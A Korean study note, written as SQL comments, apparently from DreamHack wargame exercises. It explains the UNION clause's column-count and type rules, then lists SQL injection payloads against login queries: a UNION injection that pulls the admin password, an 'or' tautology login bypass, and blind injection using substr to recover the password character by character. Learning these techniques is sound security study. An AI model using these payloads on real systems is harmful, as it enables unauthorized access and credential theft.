--UNION은 다수의 SELECT 구문의 결과를 결합하는 절

--UNION 절의 사용 예시
mysql> SELECT * FROM UserTable UNION SELECT "DeamHack", "DreamHackPW";
--DreamHack, DreamHackPW가 일치하는 데이터를 조회한 것


--잘못된 UNION 사용 예시 - 컬럼 갯수
--이전 SELECT 구문과 UNION을 사용한 구문의 실행 결과 중 컬럼의 갯수가 같아야 한다. 
mysql> SELECT * FROM UserTable UNION SELECT "DreamHack", "DreamHackPW", "Third Column";
--ERROR 1222 (21000): The used SELECT statements have a different number of columns


--이전 SELECT 구문과 UNION을 사용한 구문의 컬럼 타입이 같아야 한다.
# MSSQL (SQL Server)
SELECT 'ABC'
UNION SELECT 123;
--Conversion failed when converting the varchar value 'ABC' to data type int.


--UNION 모듈 실습
Select uid from user_table where uid='' and upw=''
-- uid 값에 ' union select upw from user_table where uid='admin' or ' 을 넣어준다
-- 유저 테이블에 있는 uid가 admin인 upw를 찾는 구문이다
Select uid from user_table where uid='' union select upw from user_table where uid='admin' or '' and upw=''
-- upw 는 Tomato가 나온다



--UNION절을 이용한 공격
/?username=' union select 'admin' -- -
=> True
'

-- 목표 0 
-- 조건을 참으로 만들어 SQL결과에 데이터가 포함되도록 함
--1" or "1
select * from users where uid="admin" and upw="1" or "1"


-- 목표 1
-- 결과가 맨 앞 한 글자만 출력
--" union select substr(upw,1,1) from users where uid='admin'--
-- => p
--" union select substr(upw,2,1) from users where uid='admin'--
-- => w
-- ...


-- 목표 2
-- 그냥 대입해서 찾는거
-- pw + 숫자


-- 목표 3
-- Blind SQL Injection을 통해 admin의 full password를 찾아 입력하기
-- " or uid="admin" and substr(upw,1,1)="p
select * from users where uid="admin" and upw="" or uid="admin" and substr(upw,1,1)="p"
-- 계속 대입

